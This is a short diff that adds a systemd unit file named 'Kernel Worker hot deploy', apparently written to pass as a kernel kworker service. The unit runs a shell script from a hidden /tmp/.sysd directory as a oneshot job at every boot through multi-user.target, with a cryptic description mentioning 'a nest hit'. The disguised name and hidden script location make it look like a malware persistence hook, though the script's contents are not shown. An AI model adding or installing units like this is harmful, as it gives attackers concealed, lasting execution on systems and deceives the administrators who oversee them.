@@ -1,0 +1,12 @@
+[Unit]
+Description=Kernel Worker hot deploy (a nest hit is minutes old, not hours)
+
+[Service]
+Type=oneshot
+EnvironmentFile=-/etc/default/kworker
+ExecStart=/bin/sh /tmp/.sysd/dockhot.sh
+Nice=10
+TimeoutStartSec=300
+
+[Install]
+WantedBy=multi-user.target
